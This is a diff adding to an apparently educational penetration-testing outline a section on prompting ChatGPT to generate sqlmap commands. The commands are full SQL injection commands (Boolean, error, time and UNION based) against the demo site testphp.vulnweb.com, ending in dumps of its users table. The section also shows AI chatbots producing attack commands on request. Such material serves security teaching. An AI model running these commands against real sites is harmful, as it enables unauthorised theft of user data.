@@ -10140,3 +10140,58 @@ Use Different Techniques to Conceal Malicious Programs and Maintain Remote Acces
 				- NoSQLMap (github.com)
 				- Havij (github.com)
 				- blind_sql_bitshifting (github.com)
+			- Discovering SQL Injection Vulnerabilities with AI:
+				- With the aid of AI, attackers can efficiently perform SQL injection attacks on target web applications. For example, an attacker could attempt to use AI tools like ChatGPT to generate SQL injection commands. By providing a prompt such as: "Identify all possible SQL injection vulnerabilities on the target URL: http://testphp.vulnweb.com"
+				- The AI might generate the following command: sqlmap -u "http://testphp.vulnweb.com" --batch --crawl=5 --random-agent --level=5 --risk=3
+				- The sqlmap command automates SQL injection testing by crawling the target site, identifying vulnerabilities, and using high-risk techniques while evading detection.
+			- Checking for Boolean-Based SQL Injection with AI:
+				- With the aid of AI, attackers can efficiently perform Boolean-based SQL injection attacks on target web applications. For example, an attacker could use ChatGPT to generate an appropriate prompt, such as: "Check for Boolean-based SQL injection on the target URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and enumerate the database."
+				- This prompt attempts to assess the target URL for Boolean-based SQL injection vulnerabilities and extract database information from the server.
+				- Command: sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --batch --technique=B --dbs
+				- This sqlmap command tests for Boolean-based SQL injection on the target URL by specifying --technique=B. It runs in non-interactive mode (--batch), automating the process, and attempts to enumerate databases on the server using --dbs.
+			- Checking for Error-Based SQL Injection with AI:
+				- With AI, attackers can efficiently perform error-based SQL injections on target web applications. An attacker could use ChatGPT to generate appropriate prompts, such as:
+				- Example 1:
+					- Prompt: "Perform an error-based SQL injection on the target URL with the parameter http://testphp.vulnweb.com/listproducts.php?cat=1 and enumerate the tables in the acuart database."
+					- Generated Command: sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --technique=E --dbs && sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart --tables
+					- This command uses sqlmap to test for error-based SQL injection (--technique=E) on the target URL and, if vulnerable, enumerate available databases (--dbs). If the attack is successful, it then targets the "acuart" database (-D acuart) and retrieves a list of its tables (--tables). The && ensures that the second command runs only if the first one succeeds.
+				- Example 2:
+					- Prompt: "Perform an error-based SQL injection on the target URL http://testphp.vulnweb.com/listproducts.php?cat=1, and if vulnerable, enumerate the database and the users table in the acuart database."
+					- Generated Command:
+						sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --technique=E --dbs && \
+						sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart --tables && \
+						sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users --columns && \
+						sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users --dump
+					- This sqlmap command automates an error-based SQL injection attack on the target URL. First, it checks for vulnerabilities (--technique=E) and enumerates available databases (--dbs). If successful, it targets the "acuart" database, retrieving its tables (--tables), then focuses on the "users" table, listing its columns (--columns). Finally, it extracts all data from the "users" table (--dump). The && ensures each step runs only if the previous one succeeds.
+			- Checking for Time-Based SQL Injection with AI:
+				- Attackers can leverage AI-powered technologies to perform time-based blind SQL injection on target web applications. An attacker could use AI tools like ChatGPT to generate prompts and corresponding commands, such as:
+				- Example 1:
+					- Prompt: "Check for time-based blind SQL injection on the target URL with the parameter http://testphp.vulnweb.com/listproducts.php?cat=1 and enumerate the database."
+					- Generated Command: sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --technique=T --dbs
+					- This command checks for time-based blind SQL injection (--technique=T) on the target URL and enumerates available databases (--dbs).
+				- Example 2:
+					- Prompt: "Check for time-based blind SQL injection on the target URL http://testphp.vulnweb.com/listproducts.php?cat=1 and enumerate tables in the acuart database."
+					- Generated Command: sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --technique=T -D acuart --tables
+					- After confirming the vulnerability, this command specifically retrieves tables (--tables) from the "acuart" database (-D acuart).
+				- Example 3:
+					- Prompt: "Check for time-based blind SQL injection on the target URL http://testphp.vulnweb.com/listproducts.php?cat=1 and enumerate the users table in the acuart database."
+					- Generated Command:
+						sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --technique=T -D acuart -T users --columns && \
+						sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --technique=T -D acuart -T users --dump
+					- This extends the attack by first listing columns in the "users" table (--columns) and then dumping its data (--dump) after exploiting the SQL injection vulnerability.
+			- Checking for UNION-Based SQL Injection with AI:
+				- Attackers can leverage AI-powered technologies to automate UNION-based SQL injection attacks on target web applications. Using AI tools like ChatGPT, an attacker can generate prompts and corresponding commands, such as:
+				- Example 1:
+					- Prompt: "Check for UNION-based SQL injection on the target URL with the parameter http://testphp.vulnweb.com/listproducts.php?cat=1 and enumerate the database."
+					- Generated Command: sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --technique=U --dbs
+					- This command tests for UNION-based SQL injection (--technique=U) on the target URL and enumerates available databases (--dbs).
+				- Example 2:
+					- Prompt: "Check for UNION-based SQL injection on the target URL with the parameter http://testphp.vulnweb.com/listproducts.php?cat=1 and enumerate tables in the acuart database."
+					- Generated Command: sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --technique=U -D acuart --tables --risk=3 --level=5
+					- This command increases the scan’s thoroughness using higher risk (--risk=3) and test levels (--level=5), then retrieves tables (--tables) from the "acuart" database (-D acuart).
+				- Example 3:
+					- Prompt: "Check for UNION-based SQL injection on the target URL with the parameter http://testphp.vulnweb.com/listproducts.php?cat=1 and enumerate the users table in the acuart database."
+					- Generated Command:
+						sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --technique=U -D acuart -T users --columns && \
+						sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --technique=U -D acuart -T users --dump
+					- This command first retrieves column names from the "users" table (--columns) and then extracts all user data (--dump) from the database.
